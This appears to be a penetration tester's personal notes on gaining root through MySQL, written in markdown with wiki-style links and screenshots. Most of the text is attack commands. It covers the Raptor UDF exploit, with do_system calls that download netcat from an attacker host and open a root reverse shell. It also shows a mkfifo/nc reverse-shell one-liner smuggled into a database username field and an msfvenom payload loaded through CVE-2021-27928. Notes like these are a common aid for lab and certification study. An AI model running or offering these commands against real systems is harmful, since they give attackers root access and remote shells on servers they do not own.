#### Enumeration

```bash - kali
ps aux | grep mysql
```

Is mysql running as root?
```bash - kali
ps aux | grep root | grep mysql
```

If so, folllow [[MySQL#Raptor User Defined Function]]

![[Grep#Grep'n for passwords]]

![[find#Hunting for config files]]

#### Raptor User Defined Function

![[14._MySQL Raptor Service Exploits]]


---
DELETE OR KEEP THE FOLLOWING?

```sql - target
insert into foo values(load_file('/var/www/raptor_udf2.so'));
```

If everything went according to plan, the `do_system` function based on our malicious UDF will grant us root-level command execution. To check this, we can run the `id` command and redirect the output to a file we can read:

```sql - target
select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
```

```sql - target
\! sh
```

```sql - target
cat /var/www/out
```

![[Pasted image 20220401112428.png]]

```sql - target
exit
```

The command did indeed execute with the highest privileges. To obtain a reverse shell, we can download our copy of the Netcat binary to the target and then run it as root. We'll continue utilizing our running python web server on port 8295.

On Kali:

```bash - kali
which nc
```

```bash - kali
cp /usr/bin/nc .
```

![[Python#Server]]

```sql - target
select do_system('wget http://$KALI:80/nc -O /var/www/nc');
```


```sql - target
select do_system('chmod 777 /var/www/nc');
```

![[rlwrap]]

```sql - target
select do_system('/var/www/nc $KALI 443 -e /bin/bash');
```

---

#### Reverse shell DB injection
![[Pasted image 20220324115631.png|1000]]

![[Pasted image 20221115145406.png]]

First, create the reverse shell file.
```bash - target
cat > script.sh <<EOF
```

```bash - target
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 80 >/tmp/f
```

```bash - target
EOF
```

Make it executable.
```bash - target
chmod +x script.sh
```

Log in to mysql.
```bash - target
mysql -u $USER -p$PASSWORD
```

```sql - target
show databases;
```

```sql - target
use <DATABASE>;
```

```sql - target
show tables;
```

```sql - target
describe <TABLE>;
```

![[Pasted image 20220324115412.png]]

```sql - target
select username, password_expiry from <TABLE>;
```

```sql - target
update <TABLE> set username=' |/tmp/Tools/script.sh';
```

```sql - target
update <TABLE> set password_expiry = (select now() + interval 7 day);
```

```sql - target
select username, password_expiry from <TABLE>;
```

![[Pasted image 20220324115509.png]]

#### CVE-2021-27928

MySQL version 10.3.25

https://github.com/Al1ex/CVE-2021-27928

```bash - kali
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f elf-so -o reverse.so
```

Copy the file to the target machine. Now stand up a listener on port 443 and issue the following command in the MySQL console to trigger the shell.

[[Python#Server]]

[[rlwrap]]

```mysql - target
SET GLOBAL wsrep_provider="/tmp/reverse.so";
```

